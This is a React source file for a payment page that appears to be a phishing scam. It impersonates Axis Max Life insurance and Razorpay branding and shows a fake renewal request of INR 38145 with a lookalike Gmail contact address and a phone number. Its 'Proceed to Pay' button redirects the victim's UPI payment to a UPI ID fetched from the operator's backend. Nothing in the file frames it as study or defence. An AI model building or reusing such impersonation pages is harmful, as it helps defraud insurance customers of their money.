import { useEffect, useState } from "react";
import axios from "axios";

export default function PaymentPage() {
  const [data, setData] = useState({
    name: "",
    amount: "",
    contactName: "",
    phone: "",
    email: "",
    upiId: "", // Backend se aane wali UPI ID ke liye
  });

  useEffect(() => {
    const fetchData = async () => {
      try {
        const res = await axios.get("http://localhost:5000/api/payment/all");
        const latest = res.data[0];

        setData({
          name: latest?.name || "Aman",
          amount: latest?.amount || 38145,
          contactName: latest?.contactName || "UMESH",
          phone: latest?.phone || "9992460821",
          email: latest?.email || "maxlifeinsuracerenuwal@gmail.com",
          upiId: latest?.upiId || "example@upi", // Yahan backend se data set karein
        });
      } catch (err) {
        console.log("Error fetching data:", err);
      }
    };
    fetchData();
  }, []);

  const handlePayment = () => {
    if (!data.upiId) {
      alert("UPI ID not available!");
      return;
    }

    // UPI Deep Link construction
    const upiUrl = `upi://pay?pa=${data.upiId}&pn=MaxServices&am=${data.amount}&cu=INR&tn=Payment_for_${data.name.replace(/\s+/g, '_')}`;
    
    // Redirect trigger
    window.location.href = upiUrl;
  };

  return (
    <div style={styles.container}>
      {/* 🔵 Top Header */}
      <div style={{ ...styles.header, display: "flex", alignItems: "center", gap: "10px" }}>
        <img src="/mx.jpg" alt="Logo" style={{ width: "60px", height: "auto" }} />
        <span style={{ fontSize: "18px", fontWeight: "bold", color: "#fff" }}>
          Axis Max Life Service
        </span>
      </div>

      {/* ⚪ Card */}
      <div style={styles.card}>
        <h3 style={styles.title}>Payment Request from Axis Max  Life Services</h3>
        <p style={styles.label}>PAYMENT FOR</p>
        <p style={styles.value}>Mr. {data.name}</p>

        <p style={styles.label}>AMOUNT PAYABLE</p>
        <h2 style={styles.amount}>INR {data.amount}</h2>

        <div style={styles.line}></div>

        <p style={styles.contactText}>
          For any queries, please contact <span style={{ color: "#007bff" }}>{data.contactName}</span>
        </p>
        <p style={styles.iconText}>📞 {data.phone}</p>
        <p style={styles.iconText}>✉️ {data.email}</p>
        <p style={styles.link}>Merchant's business policies ↗</p>
      </div>

      {/* 🔽 Bottom Section */}
      <div style={styles.bottom}>
        <h3 style={{ margin: "10px 0" }}>
          <img src="/razerpay.jpg" alt="Razorpay" style={{ width: "80px", verticalAlign: "middle", marginRight: "10px" }} />
          
        </h3>
        
        <div style={{ display: "flex", gap: "10px", margin: "10px 0", justifyContent: "center" }}>
          <img src="https://upload.wikimedia.org/wikipedia/commons/e/e1/UPI-Logo-vector.svg" alt="UPI" style={{ height: "15px" }} />
          <img src="/visa.jpg" alt="Visa" style={{ height: "15px" }} />
          <img src="/ms.png" alt="Mastercard" style={{ height: "15px" }} />
        </div>

        <p style={styles.smallText}>Want to create payment links for your business? Visit razorpay.com/payment-links</p>
        <p style={styles.blueLink}>🚩 Report Payment Link</p>

        <button style={styles.button} onClick={handlePayment}>Proceed to Pay</button>
      </div>
    </div>
  );
}

// 🎨 Styles
const styles = {
  container: { fontFamily: "Arial", background: "#f4f6f8", minHeight: "100vh", paddingBottom: "20px" },
  header: { background: "#2b6cb0", color: "#fff", padding: "15px" },
  card: { background: "#fff", margin: "15px", padding: "20px", borderRadius: "10px", boxShadow: "0 2px 10px rgba(0,0,0,0.1)" },
  title: { fontSize: "16px", marginBottom: "15px" },
  label: { fontSize: "12px", color: "#888", marginTop: "10px" },
  value: { fontSize: "14px", fontWeight: "500" },
  amount: { fontSize: "24px", margin: "5px 0" },
  line: { height: "2px", width: "30px", background: "#38a169", margin: "10px 0" },
  contactText: { fontSize: "12px", color: "#666" },
  iconText: { fontSize: "13px", marginTop: "5px" },
  link: { fontSize: "12px", color: "#007bff", marginTop: "10px", cursor: "pointer" },
  bottom: { background: "#fff", margin: "15px", padding: "20px", borderRadius: "10px", textAlign: "center" },
  smallText: { fontSize: "10px", color: "#666", marginTop: "8px" },
  blueLink: { fontSize: "12px", color: "#007bff", cursor: "pointer", marginTop: "10px" },
  button: { width: "100%", padding: "14px", marginTop: "15px", background: "#0a2540", color: "#fff", border: "none", borderRadius: "6px", fontSize: "16px", cursor: "pointer" },
};
